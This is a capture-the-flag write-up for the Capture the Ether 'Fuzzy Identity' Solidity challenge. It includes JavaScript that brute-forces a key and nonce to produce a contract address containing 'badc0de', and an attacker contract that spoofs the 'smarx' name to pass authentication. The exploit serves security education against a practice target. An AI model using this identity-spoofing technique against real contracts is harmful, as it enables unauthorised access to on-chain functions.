# Fuzzy Identity

## Challenge
Source: https://capturetheether.com/challenges/accounts/fuzzy-identity/
>This contract can only be used by me (smarx). I don’t trust myself to remember my private key, so I’ve made it so whatever address I’m using in the future will work:
>
>I always use a wallet contract that returns “smarx” if you ask its name.
>Everything I write has bad code in it, so my address always includes the hex string badc0de.
>To complete this challenge, steal my identity!

```
pragma solidity ^0.4.21;

interface IName {
    function name() external view returns (bytes32);
}

contract FuzzyIdentityChallenge {
    bool public isComplete;

    function authenticate() public {
        require(isSmarx(msg.sender));
        require(isBadCode(msg.sender));

        isComplete = true;
    }

    function isSmarx(address addr) internal view returns (bool) {
        return IName(addr).name() == bytes32("smarx");
    }

    function isBadCode(address _addr) internal pure returns (bool) {
        bytes20 addr = bytes20(_addr);
        bytes20 id = hex"000000000000000000000000000000000badc0de";
        bytes20 mask = hex"000000000000000000000000000000000fffffff";

        for (uint256 i = 0; i < 34; i++) {
            if (addr & mask == id) {
                return true;
            }
            mask <<= 4;
            id <<= 4;
        }

        return false;
    }
}
```

## Solution

This javascript will do a brute force search for an address with ```badc0de``` in it:
```
const rlp = require('rlp');
const keccak = require('keccak');
const generate = require('ethjs-account').generate;

//console.log(generate('892alsdjfn3$*hnj][][;=-4t98.34091`.039jfhHF//').address);

let nonce = 0;
let seed = '892alsdjQWmvniepw%^&@#jfLKJBn3}|[083jm22kme]$*he,x.,nj][][;=-4tCJXOPWME98.3MNB4091`.039jfhHF//';
let counter = 0;
let sender;

for (i = 0; i < 10000; i++) {
    seed = seed + Math.random().toString(36).substring(12);
    for (seeds = 0; seeds < 1000; seeds++) {
        sender = generate(seed);
        for (nonces = 0; nonces < 10; nonces++) {

            nonce = nonces;
            nonce = nonce.toString(16);
            nonce = '0x'.concat(nonce);
            let rlp_encoded = rlp.encode([sender.address,nonce]);

            let contract_address = '0x'.concat(keccak('keccak256')
                                               .update(rlp_encoded)
                                               .digest('hex')
                                               .substring(24));
            if (contract_address.match("badc0de")) {
              console.log("Attempt: " + counter);
              console.log("Generated address: " + sender.address);
              console.log("Generated privateKey: " + sender.privateKey);
              console.log("Generated publicKey: " + sender.publicKey);
              console.log("Nonce: " + nonce);
              console.log("contract address: " + contract_address);
              return true;
            }
            counter++;
            // console.log(counter);
        }
    }
    console.log(counter);
}
```

Successful output from the code above will have the following format:
* Attempt: 
```
000000
```
* Generated address: 
```
0x0000000000000000000000000000000000000000
```
* Generated privateKey: 
```
0x0000000000000000000000000000000000000000000000000000000000000000
```
* Generated publicKey:
```
0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```
* Nonce: 
```
0x0
```
* the desired ```badc0de``` contract address: 
```
0x0000000000000000000000000000000000000000
```

The ```badc0de``` contract address above is the result of the above ```nonce``` and ```generated address```. Deploy the Solidity contract ```IName``` below from the ```generated address``` determined from the javascript above on the ```nonce``` determined from the same result above:

```
pragma solidity ^0.4.24;

interface FuzzyIdentityChallenge {
    function authenticate() public;
}

contract IName {

    FuzzyIdentityChallenge public fuzzy;

    constructor(address target) public {
        fuzzy = FuzzyIdentityChallenge(target);
    }


    function name() external view returns (bytes32) {
        return bytes32("smarx");
    }

    function attack() public {
        fuzzy.authenticate();
    }
}
```

Calling the ```attack()``` function of the above ```IName``` contract will satisfy both ```require()``` statements in the ```FuzzyIdentityChallenge``` ```authenticate``` function.
